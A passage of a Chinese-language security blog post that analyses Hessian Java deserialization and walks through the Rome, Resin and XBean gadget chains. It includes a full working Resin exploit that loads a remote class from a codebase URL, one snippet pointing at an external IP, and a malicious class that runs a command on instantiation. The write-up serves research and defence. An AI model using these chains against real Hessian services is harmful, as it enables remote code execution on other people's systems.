class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessian序列化</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] result=<span class="hljs-literal">null</span>;<br>        Hessian2Output oo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<span class="hljs-comment">//封装字节流</span><br>        oo.writeObject(obj);<span class="hljs-comment">//写入序列化对象字节流</span><br>        oo.flush();<br>        result=bos.toByteArray();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessian反序列化</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> bytes</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        Hessian2Input oi=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bis);<br>        <span class="hljs-keyword">return</span> oi.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="jndi调用"><a href="#JNDI调用" class="headerlink" title="JNDI调用"></a>JNDI调用</h2><p>Hessian 还可以通过将 HessianProxyFactory 配置为 JNDI Resource 的方式来调用。看文章是用了resin来配置的，我没查到web.xml的配置，截个文章的图知道一下算了</p><p><img src="https://cdn.clown2024.cn/202410091644186.png" alt="image-20241009164415140"></p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="接口调用"><a href="#接口调用" class="headerlink" title="接口调用"></a>接口调用</h2><p>那前面的基于Servlet的代码先来分析，HessianServlet是HttpServlet的子类，那么HessianServlet 的<code>init</code> 方法将会承担一些初始化的功能，而 <code>service</code> 方法将会是相关处理的起始位置。</p><p>该类的成员变量</p><p><img src="https://cdn.clown2024.cn/202410091650586.png" alt="image-20241009165055536"></p><p><code>_homeAPI</code>(调用类的接口 Class)、<code>_homeImpl</code>(具体实现类的对象)、<code>_serializerFactory</code>(序列化工厂类)、<code>_homeSkeleton</code>(封装方法)</p><p>看一下init方法</p><p><img src="https://cdn.clown2024.cn/202410091655779.png" alt="image-20241009165531713"></p><p>就是对各变量进行判断是否为空来进行初始化，它里面调用了loadClass方法来加载类，不过他这里自己重写了一个loadClass</p><p><img src="https://cdn.clown2024.cn/202410091716251.png" alt="image-20241009171609208"></p><p><img src="https://cdn.clown2024.cn/202410091716148.png" alt="image-20241009171618113"></p><p>这里优先从线程获取类加载器，应该是为了更快加载到对应的类，避免走双亲委派的流程，线程的默认的类加载器是AppClassLoader</p><p>然后看他的service方法</p><p><img src="https://cdn.clown2024.cn/202410091723880.png" alt="image-20241009172300818"></p><p>可以看到只支持POST请求，获取id或者ejbid作为objectId，然后设置一个响应头，再去调用invoke方法</p><p><img src="https://cdn.clown2024.cn/202410091724012.png" alt="image-20241009172457963"></p><p>然后就根据objectId是否为空来选择调用的方法</p><p>先看一下第一个方法com.caucho.hessian.server.HessianSkeleton#invoke</p><p>该类的父类是AbstractSkeleton，该类对Hessian提供的服务进行封装</p><p><img src="https://cdn.clown2024.cn/202410091929088.png" alt="image-20241009192918042"></p><p>其将方法、方法名等保存在_methodMap里面</p><p><img src="https://cdn.clown2024.cn/202410091932778.png" alt="image-20241009193223729"></p><p>然后HessianSkeleton初始化就将自己的实现类保存在_service变量里面</p><p>该类里面还有两个成员变量要看一下</p><p><img src="https://cdn.clown2024.cn/202410091937552.png" alt="image-20241009193725504"></p><p>两个工厂类，HessianInputFactory就是用来读取和创建HessianInput&#x2F;Hessian2Input 流，HessianFactory用来</p><p>创建HessianInput&#x2F;Hessian2Input&#x2F;HessianOutput&#x2F;Hessian2Output流</p><p>对类基本了解后回过头继续看invoke方法</p><p><img src="https://cdn.clown2024.cn/202410091949119.png" alt="image-20241009194929048"></p><p>一开始调用_inputFactory读取header，然后根据header来创建对应的Input和Output流，最后再invoke调用一次服务</p><p>这里代码比较长就直接截文章里的图了，这个图写了注释</p><p><img src="https://cdn.clown2024.cn/202410092030361.png" alt="image-20241009203055295"></p><p>还有spring的逻辑也差不多看看文章的就好了</p><h2 id="序列化和反序列化细节"><a href="#序列化和反序列化细节" class="headerlink" title="序列化和反序列化细节"></a>序列化和反序列化细节</h2><p>序列化和反序列化的读取、写入就是由我们前面提到过的AbstractHessianInput&#x2F;AbstractHessianOutput这两个抽象类提供，然后Hessian&#x2F;Hessian2&#x2F;Burlap都提供了方法的具体实现</p><p>以Hessian2Output为例子看看序列化的写入</p><p><img src="https://cdn.clown2024.cn/202410092039705.png" alt="image-20241009203934647"></p><p>这里根据具体的类来获取序列化器然后写入序列化数据，可以看一下Serializer的实现类有多少</p><p><img src="https://cdn.clown2024.cn/202410092044894.png" alt="image-20241009204454835"></p><p>对于自定义类型，将会使用 <code>JavaSerializer/UnsafeSerializer/JavaUnsharedSerializer</code> 进行相关的序列化动作，默认情况下是 <code>UnsafeSerializer</code></p><p>看一下UnsafeSerializer#writeObject方法</p><p><img src="https://cdn.clown2024.cn/202410092233208.png" alt="image-20241009223331142"></p><p>这里会调用一个writeObjectBegin方法，该方法是AbstractHessianOutput的</p><p><img src="https://cdn.clown2024.cn/202410092236620.png" alt="image-20241009223618572"></p><p>里面再调用了一个writeMapBegin方法，Hessian2Output 重写了writeObjectBegin这个方法，而其他实现类没有。也就是说在 Hessian 1.0 和 Burlap 中，写入自定义数据类型（Object）时，都会调用 <code>writeMapBegin</code> 方法将其标记为 Map 类型。</p><p>在 Hessian 2.0 中，将会调用 <code>writeDefinition20</code> 和 <code>Hessian2Output#writeObjectBegin</code> 方法写入自定义数据，就不再将其标记为 Map 类型。</p><p>再看反序列化，以Hessian2Input为例</p><p><img src="https://cdn.clown2024.cn/202410092244449.png" alt="image-20241009224448389"></p><p>基本就是一大串的switch case语句，根据标识位进行不同的逻辑处理</p><p><img src="https://cdn.clown2024.cn/202410092309278.png" alt="image-20241009230909226"></p><p>他在反序列化时也会根据类型获取对应的反序列化器</p><p><img src="https://cdn.clown2024.cn/202410092312974.png" alt="image-20241009231208927"></p><p>然后读取自定义类型数据用的是UnsafeDeserializer类，看一下他的readObject方法</p><p><img src="https://cdn.clown2024.cn/202410092315911.png" alt="image-20241009231538854"></p><p><img src="https://cdn.clown2024.cn/202410092320613.png" alt="image-20241009232015561"></p><p>创建Unsafe类实例，然后反序列化读取Field并反射写入</p><p><img src="https://cdn.clown2024.cn/202410092320165.png" alt="image-20241009232019114"></p><p>Hessian 1.0 的 HessianInput 中，没有针对 Object 的读取，而是都将其作为 Map 读取，因为在序列化的过程中我们也提到，在写入自定义类型时会将其标记为 Map 类型。</p><p><code>MapDeserializer#readMap</code> 方法提供了针对 Map 类型数据的处理逻辑</p><p><img src="https://cdn.clown2024.cn/202410092327669.png" alt="image-20241009232731601"></p><h2 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h2><p>还是根据前面的客户端代码来调试，根据create方法一路往下</p><p><img src="https://cdn.clown2024.cn/202410092353919.png" alt="image-20241009235359859"></p><p>在这里创建了动态代理，我们知道动态代理调用方法时会走InvocationHandler#invoke方法，我们去看一下</p><p><img src="https://cdn.clown2024.cn/202410100001263.png" alt="image-20241010000103202"></p><p>这里是处理相关方法调用，再往后就是发送请求结果并反序列化，截一下文章的图</p><p><img src="https://cdn.clown2024.cn/202410100008161.png" alt="image-20241010000832095"></p><h2 id="其他实现细节"><a href="#其他实现细节" class="headerlink" title="其他实现细节"></a>其他实现细节</h2><p><strong>协议版本</strong></p><p>使用那种协议进行序列化和反序列化取决于请求标志位</p><p>这一设定位于 <code>HessianProxyFactory</code> 中的两个布尔型变量中，即 <code>_isHessian2Reply</code> 和 <code>_isHessian2Request</code></p><p><img src="https://cdn.clown2024.cn/202410100012841.png" alt="image-20241010001231800"></p><p>想更改协议自己set方法设置即可</p><p><strong>Serializable</strong></p><p>我们知道在Java 原生反序列化中，实现了 <code>java.io.Serializable</code> 接口的类才可以反序列化</p><p>Hessian在获取默认序列化器的时候会检查是否实现了Serializable接口</p><p><img src="https://cdn.clown2024.cn/202410100020094.png" alt="image-20241010002017043"></p><p>但是注意这里有一个_isAllowNonSerializable变量，它可以打破这种规范，我们只要用set方法将他设置为true，这样没有实现Serializable接口的类也能序列化</p><p>然后是 transient 和 static 的问题，在序列化时，由 <code>UnsafeSerializer#introspect</code> 方法来获取对象中的字段，在老版本中应该是 <code>getFieldMap</code> 方法。依旧是判断了成员变量标识符，如果是 transient 和 static 字段则不会参与序列化反序列化流程。</p><p><img src="https://cdn.clown2024.cn/202410100024721.png" alt="image-20241010002444663"></p><p>这个地方对标识符进行了判断，如果为 transient 和 static 字段则不会参与序列化反序列化流程</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>前面的分析可以知道Hessian大部分是利用反射写入值，且过程并没有调用类的readObject方法，也没有触发getter&#x2F;setter方法，那么漏洞点在哪呢</p><p>漏洞点就在我们前面说过的对Map类型数据的处理上，<code>MapDeserializer#readMap</code> 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。</p><p><img src="https://cdn.clown2024.cn/202410100032949.png" alt="image-20241010003247887"></p><p>那利用的方式其实就比较好联想了对于这两个类</p><p>HashMap在put的时候会调用hash方法，从而调用key.hashCode。</p><p><img src="https://cdn.clown2024.cn/202410100035334.png" alt="image-20241010003515291"></p><p>TreeMap 在 put 时，由于要进行排序，所以要对 key 进行比较操作，将会调用 compare 方法，会调用 key 的 compareTo 方法。</p><p><img src="https://cdn.clown2024.cn/202410100035008.png" alt="image-20241010003554961"></p><p>这么一看Hessian反序列化利用被限制得比较窄</p><ul><li>kick-off chain 起始方法只能为 hashCode&#x2F;equals&#x2F;compareTo 方法；</li><li>利用链中调用的成员变量不能为 transient 修饰；</li><li>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter&#x2F;setter 的逻辑。</li></ul><h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><p>在<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目里有关于该反序列化的实现，有下面五条链</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h2 id="rome链"><a href="#Rome链" class="headerlink" title="Rome链"></a>Rome链</h2><p>Rome链的核心是他的ToStringBean的toString方法，他可以调用传入类的所有无参getter方法，这里就可以打JdbcRowSetImpl的链子触发jndi</p><p>然后ToStringBean外面包一层EqualsBean和HashMap即可</p><p>触发链子如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>JdbcRowSetImpl#getDatabaseMetaData<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410101102136.png" alt="image-20241010110223027"></p><p><img src="https://cdn.clown2024.cn/202410101102006.png" alt="image-20241010110235946"></p><h3 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h3><p>上面的JNDI利用需要出网，所以可以借助SignedObject#getObject来打二次反序列化</p><p>链子改成这样就行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>SignedObject#getObject<br></code></pre></td></tr></table></figure><p>然后封装一个想要的链子进去就行了</p><h2 id="resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>该链子最终效果打的是远程类加载</p><p>参考文章：<a href="https://blog.csdn.net/uuzeray/article/details/136727060">https://blog.csdn.net/uuzeray/article/details/136727060</a></p><p>Resin是一个轻量级的、高性能的开源Java应用服务器。它是由Caucho Technology开发的，旨在提供可靠的Web应用程序和服务的运行环境，和Tomcat一样是个服务器；他常和Hessian产生联系</p><p>测试时可以导入下面的包</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.64<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Resin 这条利用链的入口点实际上是 HashMap 对比两个对象时触发的 <code>com.sun.org.apache.xpath.internal.objects.XString</code> 的 <code>equals</code> 方法。</p><p>XString的利用在ROME的HotSwappableTargetSource利用链有用到过</p><p><img src="https://cdn.clown2024.cn/202410102001525.png" alt="image-20241010200147467"></p><p>在这里我们利用的是com.caucho.naming.QName的toString方法</p><p><img src="https://cdn.clown2024.cn/202410102003734.png" alt="image-20241010200338680"></p><p>这里的逻辑比较简单，但是QName是什么，我们得先了解一下，才能知道他这样为什么可以触发</p><p>看一下他的描述</p><p><img src="https://cdn.clown2024.cn/202410102030167.png" alt="image-20241010203001097"></p><p>这里描述意思是代表一个已解析的JNDI名称</p><p>看一下他的构造方法</p><p><img src="https://cdn.clown2024.cn/202410102032765.png" alt="image-20241010203211713"></p><p>QName对象的功能是用于表示一个JNDI限定名（qualified name），通过传入的Context对象以及两个字符串参数（first和rest），QName对象可以将这些信息组合起来形成一个完整的限定名。</p><p>Context接口的描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This interface represents a naming context, which consists of a set of name-to-object bindings. It contains methods for examining and updating these bindings.<br></code></pre></td></tr></table></figure><p>此接口表示一个命名上下文，它由一组名称到对象的绑定组成。它包含检查和更新这些绑定的方法。也就是jndi的相关操作</p><p>然后我们要用到的Context的实现类是ContinuationContext</p><p>构造方法</p><p><img src="https://cdn.clown2024.cn/202410102039546.png" alt="image-20241010203937489"></p><p>CannotProceedException是javax.naming异常体系中的一种异常，通常在本地加载类失败时使用。它的作用是对无法继续进行操作的异常情况进行处理。</p><p>处理的关键在Reference类，文章给了一个对CannotProceedException类的构造</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://124.222.136.33:1337/&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br> <br><span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br> <br><span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br><span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br></code></pre></td></tr></table></figure><p>Reference构造方法</p><p><img src="https://cdn.clown2024.cn/202410102106681.png" alt="image-20241010210638627"></p><p>现在回到前面QName的toString方法，我们会调用ContinuationContext#composeName方法</p><p><img src="https://cdn.clown2024.cn/202410102113650.png" alt="image-20241010211324591"></p><p>然后调用到getTargetContext方法，这里的ctx.composeName方法可以忽略，不在利用链中</p><p><img src="https://cdn.clown2024.cn/202410102114406.png" alt="image-20241010211417350"></p><p>然后我们需要进入到NamingManager.getContext方法里面，不过还需要满足前面的两个条件</p><p>contCtx &#x3D;&#x3D; null，在构造中本身就不设置，所以不需要考虑<br>cpe.getResolvedObj()返回不为null(其实返回的就是我们上面给CannotProceedException构造的恶意Reference)，所以也不会为null</p><p>这里传的是cpe.getResolvedObj，也就是我们构造的Reference类</p><p>继续跟进</p><p><img src="https://cdn.clown2024.cn/202410102122102.png" alt="image-20241010212200426"></p><p>然后漏洞的触发点就在NamingManager#getObjectInstance这个方法里面，从名字看就是要对我们传入的Reference类进行实例化</p><p>有关该方法的描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Creates an instance of an object for the specified object and environment.<br>If an object factory builder has been installed, it is used to create a factory for creating the object. Otherwise, the following rules are used to create the object:<br>If refInfo is a Reference or Referenceable containing a factory class name, use the named factory to create the object. Return refInfo if the factory cannot be created<br>翻译一下：<br>为指定的对象和环境创建对象的实例。<br>如果已安装对象工厂生成器，则使用它来创建用于创建对象的工厂。否则，将使用以下规则创建对象：<br>如果refInfo是包含工厂类名的Reference或Referenceable，请使用命名的工厂创建对象。如果无法创建工厂，则返回refInfo。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102142943.png" alt="image-20241010214214868"></p><p>然后关键类方法是getObjectFactoryFromReference</p><p><img src="https://cdn.clown2024.cn/202410102157527.png" alt="image-20241010215719459"></p><p>这首先会从本地加载类，肯定加载不到，然后就从codebase加载，也就是我们的远程地址那里，最后及进行类的实例化，然后触发漏洞</p><p>然后就是hashMap要触发equals还要构造哈希相等，有点懒得再分析了，直接copy文章的exp小改一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">// 创建ContinuationContext对象</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);<br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);<br>        <span class="hljs-comment">// 构造方法为protected修饰</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">continuationContext</span> <span class="hljs-operator">=</span> (Context) constructor.newInstance(cannotProceedException, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;());<br><br><br>        <span class="hljs-comment">// 创建QName</span><br>        <span class="hljs-type">QName</span> <span class="hljs-variable">qName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">QName</span>(continuationContext, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(qName.hashCode());<br>        <span class="hljs-comment">// 创建Xtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// 创建HashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(qName, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意类TestRef</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestRef</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TestRef</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102208703.png" alt="image-20241010220704531"></p><h2 id="xbean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h2><p>这条链和Resin差不多</p><p>导入下面依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-naming<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>链子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#equals--&gt;XString#equals--&gt;ContextUtil.ReadOnlyBinding#toString--&gt;Binding#toString--&gt;ContextUtil.ReadOnlyBinding#getObject--&gt;ContextUtil#resolve--&gt;NamingManager#getObjectInstance<br></code></pre></td></tr></table></figure><p>看一下关键的地方</p><p>ContextUtil.ReadOnlyBinding#toString本身没有toString所以就走到父类Binding#toString</p><p><img src="https://cdn.clown2024.cn/202410102223585.png" alt="image-20241010222327507"></p><p>ContextUtil.ReadOnlyBinding#getObject</p><p><img src="https://cdn.clown2024.cn/202410102224965.png" alt="image-20241010222415889"></p><p>ContextUtil#resolve</p><p><img src="https://cdn.clown2024.cn/202410102227755.png" alt="image-20241010222504369"></p><p>然后后面的就和前面一样了</p><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> 